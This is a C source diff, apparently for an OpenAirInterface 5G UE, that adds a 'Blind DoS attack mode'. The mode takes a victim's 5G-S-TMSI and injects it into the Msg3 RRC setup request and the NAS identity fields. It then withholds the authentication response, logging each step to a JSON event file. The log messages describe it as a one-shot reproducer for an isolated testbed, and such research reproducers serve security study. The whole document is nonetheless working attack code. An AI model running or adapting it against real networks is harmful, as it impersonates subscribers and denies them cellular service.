+
+static uint64_t blind_now_ns(clockid_t clock_id)
+{
+  struct timespec ts;
+  clock_gettime(clock_id, &ts);
+  return (uint64_t)ts.tv_sec * 1000000000ULL + (uint64_t)ts.tv_nsec;
+}
+
+void nr_blind_log(int ue, const char *event, const char *fmt, ...)
+{
+  if (!blind_cfg.enable || !blind_log_fd)
+    return;
+  pthread_mutex_lock(&blind_log_mutex);
+  fprintf(blind_log_fd,
+          "{\"schema\":\"blind.attacker-event.v1\",\"run_id\":\"%s\",\"seq\":%u,"
+          "\"ue\":%d,\"realtime_ns\":%llu,\"monotonic_ns\":%llu,\"event\":\"%s\"",
+          blind_cfg.run_id,
+          ++blind_event_seq,
+          ue,
+          (unsigned long long)blind_now_ns(CLOCK_REALTIME),
+          (unsigned long long)blind_now_ns(CLOCK_MONOTONIC),
+          event);
+  if (fmt && fmt[0]) {
+    va_list ap;
+    va_start(ap, fmt);
+    fputc(',', blind_log_fd);
+    vfprintf(blind_log_fd, fmt, ap);
+    va_end(ap);
+  }
+  fputs("}\n", blind_log_fd);
+  fflush(blind_log_fd);
+  pthread_mutex_unlock(&blind_log_mutex);
+}
+
+static bool blind_safe_run_id(const char *value)
+{
+  if (!value || !value[0] || strlen(value) > 96)
+    return false;
+  for (const unsigned char *p = (const unsigned char *)value; *p; ++p)
+    if (!isalnum(*p) && *p != '.' && *p != '_' && *p != '-')
+      return false;
+  return true;
+}
+
+static uint64_t blind_parse_target(const char *value)
+{
+  AssertFatal(value && strlen(value) == 14 && value[0] == '0' && value[1] == 'x',
+              "--blind.target_5g_s_tmsi must be exactly 0x followed by 12 hex digits\n");
+  for (int i = 2; i < 14; ++i)
+    AssertFatal(isxdigit((unsigned char)value[i]),
+                "--blind.target_5g_s_tmsi must be exactly 0x followed by 12 hex digits\n");
+  errno = 0;
+  char *end = NULL;
+  unsigned long long parsed = strtoull(value + 2, &end, 16);
+  AssertFatal(errno == 0 && end && *end == '\0' && parsed <= 0xffffffffffffULL,
+              "--blind.target_5g_s_tmsi is outside the 48-bit range\n");
+  return (uint64_t)parsed;
+}
+
+static bool blind_load_target_file(int ue)
+{
+  if (atomic_load_explicit(&blind_target_ready, memory_order_acquire))
+    return true;
+  if (atomic_load_explicit(&blind_gate_terminal, memory_order_acquire) || oai_exit)
+    return false;
+  if (blind_now_ns(CLOCK_MONOTONIC) >= blind_target_deadline_ns) {
+    bool expected = false;
+    if (atomic_compare_exchange_strong_explicit(&blind_gate_terminal,
+                                                 &expected,
+                                                 true,
+                                                 memory_order_acq_rel,
+                                                 memory_order_acquire))
+      nr_blind_log(ue, "target_gate_failed", "\"reason\":\"timeout\"");
+    return false;
+  }
+
+  int fd = open(blind_cfg.target_file, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
+  if (fd < 0) {
+    if (errno != ENOENT) {
+      bool expected = false;
+      if (atomic_compare_exchange_strong_explicit(&blind_gate_terminal,
+                                                   &expected,
+                                                   true,
+                                                   memory_order_acq_rel,
+                                                   memory_order_acquire))
+        nr_blind_log(ue, "target_gate_failed", "\"reason\":\"open\",\"errno\":%d", errno);
+    }
+    return false;
+  }
+  struct stat st;
+  char value[64];
+  ssize_t length = read(fd, value, sizeof(value) - 1);
+  int saved_errno = errno;
+  bool regular = fstat(fd, &st) == 0 && S_ISREG(st.st_mode);
+  close(fd);
+  if (!regular || length <= 0 || length >= (ssize_t)sizeof(value) - 1) {
+    bool expected = false;
+    if (atomic_compare_exchange_strong_explicit(&blind_gate_terminal,
+                                                 &expected,
+                                                 true,
+                                                 memory_order_acq_rel,
+                                                 memory_order_acquire))
+      nr_blind_log(ue,
+                   "target_gate_failed",
+                   "\"reason\":\"invalid_file\",\"errno\":%d",
+                   length < 0 ? saved_errno : 0);
+    return false;
+  }
+  value[length] = '\0';
+  while (length > 0 && isspace((unsigned char)value[length - 1]))
+    value[--length] = '\0';
+  blind_target = blind_parse_target(value);
+  atomic_store_explicit(&blind_target_ready, true, memory_order_release);
+  nr_blind_log(ue,
+               "target_gate_opened",
+               "\"target_5g_s_tmsi\":\"0x%012llx\"",
+               (unsigned long long)blind_target);
+  return true;
+}
+
+static void nr_blind_config_init(configmodule_interface_t *cfg)
+{
+  paramdef_t params[] = BLIND_PARAMS_DESC;
+  config_get(cfg, params, sizeofArray(params), "blind");
+  AssertFatal(blind_cfg.enable == 0 || blind_cfg.enable == 1, "--blind.enable must be 0 or 1\n");
+  AssertFatal(blind_cfg.recovery_mode == 0 || blind_cfg.recovery_mode == 1,
+              "--blind.recovery_mode must be 0 or 1\n");
+  AssertFatal(blind_cfg.tun_suffix == 0 || blind_cfg.tun_suffix == 1,
+              "--blind.tun_suffix must be 0 or 1\n");
+  AssertFatal(blind_cfg.target_wait_s >= 1 && blind_cfg.target_wait_s <= 600,
+              "--blind.target_wait_s must be 1..600\n");
+  if (!blind_cfg.enable)
+    return;
+
+  AssertFatal(NB_UE_INST == 1, "Blind DoS attack mode requires --num-ues 1\n");
+  AssertFatal(blind_cfg.amf_region_id >= 0 && blind_cfg.amf_region_id <= 255,
+              "--blind.amf_region_id must be 0..255 in attack mode\n");
+  AssertFatal(blind_safe_run_id(blind_cfg.run_id),
+              "--blind.run_id must use 1..96 characters from [A-Za-z0-9._-]\n");
+  AssertFatal(blind_cfg.log_file && blind_cfg.log_file[0] == '/',
+              "--blind.log_file must be a non-empty absolute path\n");
+  const bool direct_target = blind_cfg.target_text && blind_cfg.target_text[0];
+  const bool gated_target = blind_cfg.target_file && blind_cfg.target_file[0];
+  AssertFatal(direct_target != gated_target,
+              "Blind attack mode requires exactly one of --blind.target_5g_s_tmsi or --blind.target_file\n");
+  if (gated_target) {
+    AssertFatal(blind_cfg.target_file[0] == '/', "--blind.target_file must be an absolute path\n");
+    blind_target_deadline_ns = blind_now_ns(CLOCK_MONOTONIC)
+                               + (uint64_t)blind_cfg.target_wait_s * 1000000000ULL;
+  }
+  if (direct_target) {
+    blind_target = blind_parse_target(blind_cfg.target_text);
+    atomic_store_explicit(&blind_target_ready, true, memory_order_release);
+  }
+  blind_log_fd = fopen(blind_cfg.log_file, "wx");
+  AssertFatal(blind_log_fd != NULL,
+              "Cannot create new --blind.log_file %s: %s\n",
+              blind_cfg.log_file,
+              strerror(errno));
+  setvbuf(blind_log_fd, NULL, _IOLBF, 0);
+  atomic_store_explicit(&blind_state, BLIND_ARMED, memory_order_release);
+  if (direct_target)
+    LOG_W(NR_RRC,
+          "[BLIND] one-shot reproducer armed for isolated testbed run_id=%s target=0x%012llx\n",
+          blind_cfg.run_id,
+          (unsigned long long)blind_target);
+  else
+    LOG_W(NR_RRC,
+          "[BLIND] one-shot reproducer armed for isolated testbed run_id=%s target=deferred\n",
+          blind_cfg.run_id);
+}
+
+bool nr_blind_use_pdu_suffix(void)
+{
+  return blind_cfg.tun_suffix == 1;
+}
+
+bool nr_blind_recovery_enabled(void)
+{
+  return blind_cfg.recovery_mode == 1;
+}
+
+bool nr_blind_defer_initial_ra(void)
+{
+  return blind_cfg.enable && blind_cfg.target_file && blind_cfg.target_file[0];
+}
+
+bool nr_blind_take_target_gate(int ue)
+{
+  if (!nr_blind_defer_initial_ra() || !blind_load_target_file(ue))
+    return false;
+  AssertFatal(ue == 0, "Blind DoS attack mode supports UE instance 0 only\n");
+  bool expected = false;
+  return atomic_compare_exchange_strong_explicit(&blind_ra_triggered,
+                                                  &expected,
+                                                  true,
+                                                  memory_order_acq_rel,
+                                                  memory_order_acquire);
+}
+
+bool nr_blind_prepare_setup_request(int ue, bool actual_msg3, uint64_t *fiveg_s_tmsi)
+{
+  if (!blind_cfg.enable)
+    return true;
+  AssertFatal(ue == 0, "Blind DoS attack mode supports UE instance 0 only\n");
+  if (!atomic_load_explicit(&blind_target_ready, memory_order_acquire)
+      && !blind_load_target_file(ue))
+    return false;
+  if (!actual_msg3 && nr_blind_defer_initial_ra()
+      && atomic_load_explicit(&blind_ra_triggered, memory_order_acquire))
+    return false;
+  int state = atomic_load_explicit(&blind_state, memory_order_acquire);
+  if (state >= BLIND_MSG3_COMMITTED) {
+    nr_blind_log(ue,
+                 "retry_blocked",
+                 "\"source\":\"%s\",\"state\":%d",
+                 actual_msg3 ? "msg3_prepare" : "prebuild_or_t300",
+                 state);
+    return false;
+  }
+
+  *fiveg_s_tmsi = blind_target;
+  if (!actual_msg3)
+    return true;
+
+  int expected = BLIND_ARMED;
+  if (!atomic_compare_exchange_strong_explicit(&blind_state,
+                                                &expected,
+                                                BLIND_MSG3_COMMITTED,
+                                                memory_order_acq_rel,
+                                                memory_order_acquire)) {
+    nr_blind_log(ue, "retry_blocked", "\"source\":\"msg3_race\",\"state\":%d", expected);
+    return false;
+  }
+  const uint64_t part1 = blind_target & 0x7fffffffffULL;
+  const unsigned part2 = (unsigned)((blind_target >> 39) & 0x1ffU);
+  nr_blind_log(ue,
+               "target_msg3_committed",
+               "\"target_5g_s_tmsi\":\"0x%012llx\",\"part1\":%llu,\"part2\":%u,"
+               "\"claim\":\"payload_committed_not_air_confirmed\"",
+               (unsigned long long)blind_target,
+               (unsigned long long)part1,
+               part2);
+  return true;
+}
+
+bool nr_blind_attempt_active(int ue)
+{
+  return blind_cfg.enable && ue == 0
+         && atomic_load_explicit(&blind_state, memory_order_acquire) >= BLIND_MSG3_COMMITTED;
+}
+
+bool nr_blind_nas_target(int ue,
+                         uint8_t *amf_region_id,
+                         uint16_t *amf_set_id,
+                         uint8_t *amf_pointer,
+                         uint32_t *tmsi)
+{
+  if (!nr_blind_attempt_active(ue))
+    return false;
+  *amf_region_id = (uint8_t)blind_cfg.amf_region_id;
+  *amf_set_id = (uint16_t)((blind_target >> 38) & 0x3ffU);
+  *amf_pointer = (uint8_t)((blind_target >> 32) & 0x3fU);
+  *tmsi = (uint32_t)blind_target;
+  return true;
+}
+
+void nr_blind_note_setup_complete(int ue)
+{
+  if (!nr_blind_attempt_active(ue))
+    return;
+  int expected = BLIND_MSG3_COMMITTED;
+  if (atomic_compare_exchange_strong_explicit(&blind_state,
+                                               &expected,
+                                               BLIND_MSG5_SUBMITTED,
+                                               memory_order_acq_rel,
+                                               memory_order_acquire))
+    nr_blind_log(ue, "rrc_setup_complete_submitted", "\"identity_encoding\":\"part2\"");
+}
+
+bool nr_blind_withhold_auth(int ue)
+{
+  if (!nr_blind_attempt_active(ue))
+    return false;
+  int state = atomic_load_explicit(&blind_state, memory_order_acquire);
+  bool repeated = state == BLIND_OBSERVING;
+  while (state < BLIND_OBSERVING
+         && !atomic_compare_exchange_weak_explicit(&blind_state,
+                                                    &state,
+                                                    BLIND_OBSERVING,
+                                                    memory_order_acq_rel,
+                                                    memory_order_acquire)) {}
+  nr_blind_log(ue,
+               "authentication_request_withheld",
+               "\"response_submitted\":false,\"retransmission\":%s",
+               repeated ? "true" : "false");
+  return true;
+}
